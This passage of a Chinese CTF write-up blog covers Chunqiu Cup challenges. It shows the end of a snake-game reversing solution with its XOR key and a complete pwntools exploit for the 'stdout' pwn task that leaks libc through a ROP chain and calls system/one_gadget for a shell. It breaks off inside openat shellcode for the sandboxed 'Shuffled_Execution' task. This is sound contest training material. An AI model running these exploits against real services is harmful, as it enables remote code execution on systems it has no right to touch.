punctuation\">)</span></pre></td></tr><tr><td data-num=\"119\"></td><td><pre>    window<span class=\"token punctuation\">.</span>blit<span class=\"token punctuation\">(</span>score_text<span class=\"token punctuation\">,</span> <span class=\"token punctuation\">(</span><span class=\"token number\">10</span><span class=\"token punctuation\">,</span> <span class=\"token number\">10</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"120\"></td><td><pre>    window<span class=\"token punctuation\">.</span>blit<span class=\"token punctuation\">(</span>speed_text<span class=\"token punctuation\">,</span> <span class=\"token punctuation\">(</span><span class=\"token number\">10</span><span class=\"token punctuation\">,</span> <span class=\"token number\">40</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"121\"></td><td><pre>    score <span class=\"token operator\">=</span> <span class=\"token builtin\">len</span><span class=\"token punctuation\">(</span>snake<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"122\"></td><td><pre>    <span class=\"token keyword\">if</span> score <span class=\"token operator\">>=</span> <span class=\"token number\">9999</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"123\"></td><td><pre>        flag_text <span class=\"token operator\">=</span> font<span class=\"token punctuation\">.</span>render<span class=\"token punctuation\">(</span><span class=\"token string\">'Flag: '</span> <span class=\"token operator\">+</span> decrypted_data<span class=\"token punctuation\">.</span>decode<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span> <span class=\"token boolean\">True</span><span class=\"token punctuation\">,</span> WHITE<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"124\"></td><td><pre>        window<span class=\"token punctuation\">.</span>blit<span class=\"token punctuation\">(</span>flag_text<span class=\"token punctuation\">,</span> <span class=\"token punctuation\">(</span><span class=\"token number\">10</span><span class=\"token punctuation\">,</span> <span class=\"token number\">70</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"125\"></td><td><pre>    pygame<span class=\"token punctuation\">.</span>display<span class=\"token punctuation\">.</span>update<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"126\"></td><td><pre>    pygame<span class=\"token punctuation\">.</span>time<span class=\"token punctuation\">.</span>Clock<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span>tick<span class=\"token punctuation\">(</span><span class=\"token number\">10</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"127\"></td><td><pre>    <span class=\"token keyword\">continue</span></pre></td></tr><tr><td data-num=\"128\"></td><td><pre>pygame<span class=\"token punctuation\">.</span>quit<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr></table></figure><blockquote>\n<p>需要导入 key</p>\n</blockquote>\n<p><img data-src=\"/img/%E6%98%A5%E7%A7%8B%E6%9D%AF%E5%A4%8F%E5%AD%A3%E8%B5%9B/image-20240706171530275.png\" alt=\"image-20240706171530275\"></p>\n<blockquote>\n<p>xor_key = ‘V3rY_v3Ry_Ez’</p>\n</blockquote>\n<p>rc4 之后再去异或自身位置即可得到 flag</p>\n<blockquote KMLTz3lT_MePUDa7A_P5LpzCBT=\"\">\n<p>flag</p>\n</blockquote>\n<h3 id=\"stdout\"><a class=\"markdownIt-Anchor\" href=\"#stdout\">#</a> stdout</h3>\n<img data-src=\"/img/春秋杯夏季赛/image-20240706171807876.png\" alt=\"image-20240706171807876\" style=\"zoom:67%;\" />\n<p>程序即使有 puts 也不能输出</p>\n<p><span class=\"exturl\" data-url=\"aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0F0b21UZWFtL2FydGljbGUvZGV0YWlscy8xMzk2NzIxMjI=\">2024 全国大学生信息安全竞赛（ciscn）半决赛（东北赛区）Pwn 题解_2024ciscn 华东北赛区 wp-CSDN 博客</span></p>\n<p>类似题目</p>\n<p>exp</p>\n<figure class=\"highlight python\"><figcaption data-lang=\"python\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">from</span> LibcSearcher <span class=\"token keyword\">import</span> <span class=\"token operator\">*</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token keyword\">from</span> pwn <span class=\"token keyword\">import</span> <span class=\"token operator\">*</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token comment\"># from ctypes import *</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>context<span class=\"token punctuation\">(</span>arch<span class=\"token operator\">=</span><span class=\"token string\">'amd64'</span><span class=\"token punctuation\">,</span> os<span class=\"token operator\">=</span><span class=\"token string\">'linux'</span><span class=\"token punctuation\">,</span> log_level<span class=\"token operator\">=</span><span class=\"token string\">'debug'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>host<span class=\"token punctuation\">,</span> port <span class=\"token operator\">=</span> <span class=\"token string\">\"8.147.128.163:44437\"</span><span class=\"token punctuation\">.</span>split<span class=\"token punctuation\">(</span><span class=\"token string\">\":\"</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>r <span class=\"token operator\">=</span> remote<span class=\"token punctuation\">(</span>host<span class=\"token punctuation\">,</span> <span class=\"token builtin\">int</span><span class=\"token punctuation\">(</span>port<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre><span class=\"token comment\"># r = process('./pwn')</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre></pre></td></tr><tr><td data-num=\"9\"></td><td><pre>libc <span class=\"token operator\">=</span> ELF<span class=\"token punctuation\">(</span><span class=\"token string\">'libc-2.31.so'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre>elf <span class=\"token operator\">=</span> ELF<span class=\"token punctuation\">(</span><span class=\"token string\">'./pwn'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre></pre></td></tr><tr><td data-num=\"12\"></td><td><pre></pre></td></tr><tr><td data-num=\"13\"></td><td><pre>se      <span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span> data               <span class=\"token punctuation\">:</span> r<span class=\"token punctuation\">.</span>send<span class=\"token punctuation\">(</span>data<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre>sa      <span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span> delim<span class=\"token punctuation\">,</span> data         <span class=\"token punctuation\">:</span> r<span class=\"token punctuation\">.</span>sendafter<span class=\"token punctuation\">(</span>delim<span class=\"token punctuation\">,</span> data<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"15\"></td><td><pre>sl      <span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span> data               <span class=\"token punctuation\">:</span> r<span class=\"token punctuation\">.</span>sendline<span class=\"token punctuation\">(</span>data<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"16\"></td><td><pre>sla     <span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span> delim<span class=\"token punctuation\">,</span> data         <span class=\"token punctuation\">:</span> r<span class=\"token punctuation\">.</span>sendlineafter<span class=\"token punctuation\">(</span>delim<span class=\"token punctuation\">,</span> data<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"17\"></td><td><pre>sea     <span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span> delim<span class=\"token punctuation\">,</span> data         <span class=\"token punctuation\">:</span> r<span class=\"token punctuation\">.</span>sendafter<span class=\"token punctuation\">(</span>delim<span class=\"token punctuation\">,</span> data<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"18\"></td><td><pre>rc      <span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span> numb<span class=\"token operator\">=</span><span class=\"token number\">4096</span>          <span class=\"token punctuation\">:</span> r<span class=\"token punctuation\">.</span>recv<span class=\"token punctuation\">(</span>numb<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"19\"></td><td><pre>rl      <span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span>                    <span class=\"token punctuation\">:</span> r<span class=\"token punctuation\">.</span>recvline<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"20\"></td><td><pre>ru      <span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span> delims             <span class=\"token punctuation\">:</span> r<span class=\"token punctuation\">.</span>recvuntil<span class=\"token punctuation\">(</span>delims<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"21\"></td><td><pre>uu32    <span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span> data               <span class=\"token punctuation\">:</span> u32<span class=\"token punctuation\">(</span>data<span class=\"token punctuation\">.</span>ljust<span class=\"token punctuation\">(</span><span class=\"token number\">4</span><span class=\"token punctuation\">,</span> <span class=\"token string\">b'\\0'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"22\"></td><td><pre>uu64    <span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span> data               <span class=\"token punctuation\">:</span> u64<span class=\"token punctuation\">(</span>data<span class=\"token punctuation\">.</span>ljust<span class=\"token punctuation\">(</span><span class=\"token number\">8</span><span class=\"token punctuation\">,</span> <span class=\"token string\">b'\\0'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"23\"></td><td><pre>lic     <span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span> data               <span class=\"token punctuation\">:</span> uu64<span class=\"token punctuation\">(</span>ru<span class=\"token punctuation\">(</span>data<span class=\"token punctuation\">)</span><span class=\"token punctuation\">[</span><span class=\"token operator\">-</span><span class=\"token number\">6</span><span class=\"token punctuation\">:</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"24\"></td><td><pre>pack    <span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span> <span class=\"token builtin\">str</span><span class=\"token punctuation\">,</span> addr          <span class=\"token punctuation\">:</span> p32<span class=\"token punctuation\">(</span>addr<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"25\"></td><td><pre>padding <span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span> length             <span class=\"token punctuation\">:</span> <span class=\"token string\">b'Yhuan'</span> <span class=\"token operator\">*</span> <span class=\"token punctuation\">(</span>length <span class=\"token operator\">//</span> <span class=\"token number\">5</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">+</span> <span class=\"token string\">b'Y'</span> <span class=\"token operator\">*</span> <span class=\"token punctuation\">(</span>length <span class=\"token operator\">%</span> <span class=\"token number\">5</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"26\"></td><td><pre>it      <span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span>                    <span class=\"token punctuation\">:</span> r<span class=\"token punctuation\">.</span>interactive<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"27\"></td><td><pre></pre></td></tr><tr><td data-num=\"28\"></td><td><pre><span class=\"token keyword\">def</span> <span class=\"token function\">debug</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"29\"></td><td><pre>\tgdb<span class=\"token punctuation\">.</span>attach<span class=\"token punctuation\">(</span>r<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"30\"></td><td><pre>\tpause<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"31\"></td><td><pre><span class=\"token comment\"># debug()</span></pre></td></tr><tr><td data-num=\"32\"></td><td><pre></pre></td></tr><tr><td data-num=\"33\"></td><td><pre>pop_rdi <span class=\"token operator\">=</span> <span class=\"token number\">0x00000000004013d3</span></pre></td></tr><tr><td data-num=\"34\"></td><td><pre>ret <span class=\"token operator\">=</span> pop_rdi <span class=\"token operator\">+</span> <span class=\"token number\">1</span></pre></td></tr><tr><td data-num=\"35\"></td><td><pre></pre></td></tr><tr><td data-num=\"36\"></td><td><pre>pl <span class=\"token operator\">=</span> padding<span class=\"token punctuation\">(</span><span class=\"token number\">0x50</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">+</span> p64<span class=\"token punctuation\">(</span>elf<span class=\"token punctuation\">.</span>sym<span class=\"token punctuation\">[</span><span class=\"token string\">'vuln'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">+</span> p64<span class=\"token punctuation\">(</span>elf<span class=\"token punctuation\">.</span>sym<span class=\"token punctuation\">[</span><span class=\"token string\">'vuln'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"37\"></td><td><pre></pre></td></tr><tr><td data-num=\"38\"></td><td><pre></pre></td></tr><tr><td data-num=\"39\"></td><td><pre>se<span class=\"token punctuation\">(</span>pl<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"40\"></td><td><pre></pre></td></tr><tr><td data-num=\"41\"></td><td><pre><span class=\"token keyword\">for</span> i <span class=\"token keyword\">in</span> <span class=\"token builtin\">range</span><span class=\"token punctuation\">(</span><span class=\"token number\">150</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"42\"></td><td><pre>    payload <span class=\"token operator\">=</span> <span class=\"token punctuation\">(</span><span class=\"token string\">b'system\\x00\\x00'</span> <span class=\"token operator\">*</span> <span class=\"token punctuation\">(</span><span class=\"token number\">0x20</span> <span class=\"token operator\">//</span> <span class=\"token number\">8</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">+</span> <span class=\"token string\">b'deadbeef'</span> <span class=\"token operator\">+</span> p64<span class=\"token punctuation\">(</span>elf<span class=\"token punctuation\">.</span>sym<span class=\"token punctuation\">[</span><span class=\"token string\">'extend'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">+</span></pre></td></tr><tr><td data-num=\"43\"></td><td><pre>     p64<span class=\"token punctuation\">(</span>pop_rdi<span class=\"token punctuation\">)</span> <span class=\"token operator\">+</span> p64<span class=\"token punctuation\">(</span>elf<span class=\"token punctuation\">.</span>got<span class=\"token punctuation\">[</span><span class=\"token string\">'puts'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">+</span> p64<span class=\"token punctuation\">(</span>elf<span class=\"token punctuation\">.</span>plt<span class=\"token punctuation\">[</span><span class=\"token string\">'puts'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">+</span> p64<span class=\"token punctuation\">(</span>elf<span class=\"token punctuation\">.</span>sym<span class=\"token punctuation\">[</span><span class=\"token string\">'vuln'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"44\"></td><td><pre>    <span class=\"token comment\"># sleep(0.1)</span></pre></td></tr><tr><td data-num=\"45\"></td><td><pre>    se<span class=\"token punctuation\">(</span>payload<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"46\"></td><td><pre>    success<span class=\"token punctuation\">(</span>i<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"47\"></td><td><pre>    <span class=\"token keyword\">try</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"48\"></td><td><pre>        res<span class=\"token operator\">=</span> r<span class=\"token punctuation\">.</span>recvuntil<span class=\"token punctuation\">(</span><span class=\"token string\">b'hello!\\n'</span><span class=\"token punctuation\">,</span>timeout<span class=\"token operator\">=</span><span class=\"token number\">0.1</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"49\"></td><td><pre>        <span class=\"token keyword\">if</span> res<span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"50\"></td><td><pre>            libc_addr <span class=\"token operator\">=</span> u64<span class=\"token punctuation\">(</span>rc<span class=\"token punctuation\">(</span><span class=\"token number\">6</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span>ljust<span class=\"token punctuation\">(</span><span class=\"token number\">8</span><span class=\"token punctuation\">,</span> <span class=\"token string\">b'\\x00'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">-</span> libc<span class=\"token punctuation\">.</span>sym<span class=\"token punctuation\">[</span><span class=\"token string\">'puts'</span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"51\"></td><td><pre>            <span class=\"token keyword\">break</span></pre></td></tr><tr><td data-num=\"52\"></td><td><pre>    <span class=\"token keyword\">except</span> EOFError<span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"53\"></td><td><pre>        <span class=\"token keyword\">continue</span></pre></td></tr><tr><td data-num=\"54\"></td><td><pre>    <span class=\"token keyword\">except</span> Exception <span class=\"token keyword\">as</span> e<span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"55\"></td><td><pre>        log<span class=\"token punctuation\">.</span>error<span class=\"token punctuation\">(</span><span class=\"token string-interpolation\"><span class=\"token string\">f\"An error occurred: </span><span class=\"token interpolation\"><span class=\"token punctuation\">&#123;</span>e<span class=\"token punctuation\">&#125;</span></span><span class=\"token string\">\"</span></span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"56\"></td><td><pre>        <span class=\"token keyword\">continue</span></pre></td></tr><tr><td data-num=\"57\"></td><td><pre>    <span class=\"token keyword\">finally</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"58\"></td><td><pre>        <span class=\"token keyword\">pass</span></pre></td></tr><tr><td data-num=\"59\"></td><td><pre></pre></td></tr><tr><td data-num=\"60\"></td><td><pre>log<span class=\"token punctuation\">.</span>success<span class=\"token punctuation\">(</span><span class=\"token string-interpolation\"><span class=\"token string\">f\"Found libc address: </span><span class=\"token interpolation\"><span class=\"token punctuation\">&#123;</span><span class=\"token builtin\">hex</span><span class=\"token punctuation\">(</span>libc_addr<span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#125;</span></span><span class=\"token string\">\"</span></span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"61\"></td><td><pre></pre></td></tr><tr><td data-num=\"62\"></td><td><pre></pre></td></tr><tr><td data-num=\"63\"></td><td><pre><span class=\"token comment\"># debug()</span></pre></td></tr><tr><td data-num=\"64\"></td><td><pre>rc<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"65\"></td><td><pre>system <span class=\"token operator\">=</span> libc_addr <span class=\"token operator\">+</span> libc<span class=\"token punctuation\">.</span>sym<span class=\"token punctuation\">[</span><span class=\"token string\">'system'</span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"66\"></td><td><pre>binsh <span class=\"token operator\">=</span> libc_addr <span class=\"token operator\">+</span> <span class=\"token builtin\">next</span><span class=\"token punctuation\">(</span>libc<span class=\"token punctuation\">.</span>search<span class=\"token punctuation\">(</span><span class=\"token string\">b'/bin/sh'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"67\"></td><td><pre>r15 <span class=\"token operator\">=</span><span class=\"token number\">0x0000000000023b69</span><span class=\"token operator\">+</span>libc_addr</pre></td></tr><tr><td data-num=\"68\"></td><td><pre>rdx <span class=\"token operator\">=</span><span class=\"token number\">0x0000000000142c92</span><span class=\"token operator\">+</span>libc_addr</pre></td></tr><tr><td data-num=\"69\"></td><td><pre></pre></td></tr><tr><td data-num=\"70\"></td><td><pre>ogg <span class=\"token operator\">=</span> <span class=\"token punctuation\">[</span><span class=\"token number\">0xe3afe</span><span class=\"token punctuation\">,</span><span class=\"token number\">0xe3b01</span><span class=\"token punctuation\">,</span><span class=\"token number\">0xe3b04</span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"71\"></td><td><pre>payload <span class=\"token operator\">=</span> p64<span class=\"token punctuation\">(</span>system<span class=\"token punctuation\">)</span> <span class=\"token operator\">*</span> <span class=\"token punctuation\">(</span><span class=\"token number\">0x20</span><span class=\"token operator\">//</span><span class=\"token number\">8</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">+</span> p64<span class=\"token punctuation\">(</span>system<span class=\"token punctuation\">)</span> <span class=\"token operator\">+</span> p64<span class=\"token punctuation\">(</span>ret<span class=\"token punctuation\">)</span> <span class=\"token operator\">+</span> p64<span class=\"token punctuation\">(</span>r15<span class=\"token punctuation\">)</span> <span class=\"token operator\">+</span> p64<span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">+</span> p64<span class=\"token punctuation\">(</span>rdx<span class=\"token punctuation\">)</span> <span class=\"token operator\">+</span> p64<span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">+</span> p64<span class=\"token punctuation\">(</span>ogg<span class=\"token punctuation\">[</span><span class=\"token number\">1</span><span class=\"token punctuation\">]</span><span class=\"token operator\">+</span>libc_addr<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"72\"></td><td><pre>se<span class=\"token punctuation\">(</span>payload<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"73\"></td><td><pre>it<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr></table></figure><img data-src=\"/img/春秋杯夏季赛/image-20240706172123978.png\" alt=\"image-20240706172123978\" style=\"zoom: 67%;\" />\n<h3 id=\"shuffled_execution\"><a class=\"markdownIt-Anchor\" href=\"#shuffled_execution\">#</a> Shuffled_Execution</h3>\n<img data-src=\"/img/春秋杯夏季赛/image-20240706172247612.png\" alt=\"image-20240706172247612\" style=\"zoom:67%;\" />\n<p>程序开启了沙盒</p>\n<img data-src=\"/img/春秋杯夏季赛/image-20240706172333749.png\" alt=\"image-20240706172333749\" style=\"zoom:80%;\" />\n<figure class=\"highlight python\"><figcaption data-lang=\"python\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">from</span> LibcSearcher <span class=\"token keyword\">import</span> <span class=\"token operator\">*</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token keyword\">from</span> pwn <span class=\"token keyword\">import</span> <span class=\"token operator\">*</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token comment\"># from ctypes import *</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>context<span class=\"token punctuation\">(</span>arch<span class=\"token operator\">=</span><span class=\"token string\">'amd64'</span><span class=\"token punctuation\">,</span> os<span class=\"token operator\">=</span><span class=\"token string\">'linux'</span><span class=\"token punctuation\">,</span> log_level<span class=\"token operator\">=</span><span class=\"token string\">'debug'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>host<span class=\"token punctuation\">,</span> port <span class=\"token operator\">=</span> <span class=\"token string\">\"39.106.48.123:24059\"</span><span class=\"token punctuation\">.</span>split<span class=\"token punctuation\">(</span><span class=\"token string\">\":\"</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>r <span class=\"token operator\">=</span> remote<span class=\"token punctuation\">(</span>host<span class=\"token punctuation\">,</span> <span class=\"token builtin\">int</span><span class=\"token punctuation\">(</span>port<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre><span class=\"token comment\"># r = process('./pwn')</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>elf <span class=\"token operator\">=</span> ELF<span class=\"token punctuation\">(</span><span class=\"token string\">'./pwn'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre></pre></td></tr><tr><td data-num=\"10\"></td><td><pre></pre></td></tr><tr><td data-num=\"11\"></td><td><pre>se      <span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span> data               <span class=\"token punctuation\">:</span> r<span class=\"token punctuation\">.</span>send<span class=\"token punctuation\">(</span>data<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre>sa      <span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span> delim<span class=\"token punctuation\">,</span> data         <span class=\"token punctuation\">:</span> r<span class=\"token punctuation\">.</span>sendafter<span class=\"token punctuation\">(</span>delim<span class=\"token punctuation\">,</span> data<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre>sl      <span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span> data               <span class=\"token punctuation\">:</span> r<span class=\"token punctuation\">.</span>sendline<span class=\"token punctuation\">(</span>data<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre>sla     <span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span> delim<span class=\"token punctuation\">,</span> data         <span class=\"token punctuation\">:</span> r<span class=\"token punctuation\">.</span>sendlineafter<span class=\"token punctuation\">(</span>delim<span class=\"token punctuation\">,</span> data<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"15\"></td><td><pre>sea     <span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span> delim<span class=\"token punctuation\">,</span> data         <span class=\"token punctuation\">:</span> r<span class=\"token punctuation\">.</span>sendafter<span class=\"token punctuation\">(</span>delim<span class=\"token punctuation\">,</span> data<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"16\"></td><td><pre>rc      <span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span> numb<span class=\"token operator\">=</span><span class=\"token number\">4096</span>          <span class=\"token punctuation\">:</span> r<span class=\"token punctuation\">.</span>recv<span class=\"token punctuation\">(</span>numb<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"17\"></td><td><pre>rl      <span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span>                    <span class=\"token punctuation\">:</span> r<span class=\"token punctuation\">.</span>recvline<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"18\"></td><td><pre>ru      <span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span> delims             <span class=\"token punctuation\">:</span> r<span class=\"token punctuation\">.</span>recvuntil<span class=\"token punctuation\">(</span>delims<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"19\"></td><td><pre>uu32    <span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span> data               <span class=\"token punctuation\">:</span> u32<span class=\"token punctuation\">(</span>data<span class=\"token punctuation\">.</span>ljust<span class=\"token punctuation\">(</span><span class=\"token number\">4</span><span class=\"token punctuation\">,</span> <span class=\"token string\">b'\\0'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"20\"></td><td><pre>uu64    <span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span> data               <span class=\"token punctuation\">:</span> u64<span class=\"token punctuation\">(</span>data<span class=\"token punctuation\">.</span>ljust<span class=\"token punctuation\">(</span><span class=\"token number\">8</span><span class=\"token punctuation\">,</span> <span class=\"token string\">b'\\0'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"21\"></td><td><pre>lic     <span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span> data               <span class=\"token punctuation\">:</span> uu64<span class=\"token punctuation\">(</span>ru<span class=\"token punctuation\">(</span>data<span class=\"token punctuation\">)</span><span class=\"token punctuation\">[</span><span class=\"token operator\">-</span><span class=\"token number\">6</span><span class=\"token punctuation\">:</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"22\"></td><td><pre>pack    <span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span> <span class=\"token builtin\">str</span><span class=\"token punctuation\">,</span> addr          <span class=\"token punctuation\">:</span> p32<span class=\"token punctuation\">(</span>addr<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"23\"></td><td><pre>padding <span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span> length             <span class=\"token punctuation\">:</span> <span class=\"token string\">b'Yhuan'</span> <span class=\"token operator\">*</span> <span class=\"token punctuation\">(</span>length <span class=\"token operator\">//</span> <span class=\"token number\">5</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">+</span> <span class=\"token string\">b'Y'</span> <span class=\"token operator\">*</span> <span class=\"token punctuation\">(</span>length <span class=\"token operator\">%</span> <span class=\"token number\">5</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"24\"></td><td><pre>it      <span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span>                    <span class=\"token punctuation\">:</span> r<span class=\"token punctuation\">.</span>interactive<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"25\"></td><td><pre></pre></td></tr><tr><td data-num=\"26\"></td><td><pre>pay <span class=\"token operator\">=</span> <span class=\"token string-interpolation\"><span class=\"token string\">f\"\"\"</pre></td></tr><tr><td data-num=\"27\"></td><td><pre>/* openat */</pre></td></tr><tr><td data-num=\"28\"></td><td><pre>mov rsp,0x1337500</pre></td></tr><tr><td data-num=\"29\"></td><td><pre>mov rax,0x00000067616c662f;</pre></td></tr><tr><td data-num=\"30\"></td><td><pre>push rax;</pre></td></tr><tr><td data-num=\"31\"></td><td><pre>push rsp;</pre></td></tr><tr><td data-num=\"32\"></td><td><pre>pop rsi;</pre></td></tr><tr><td data-num=\"33\"></td><td><pre>xor 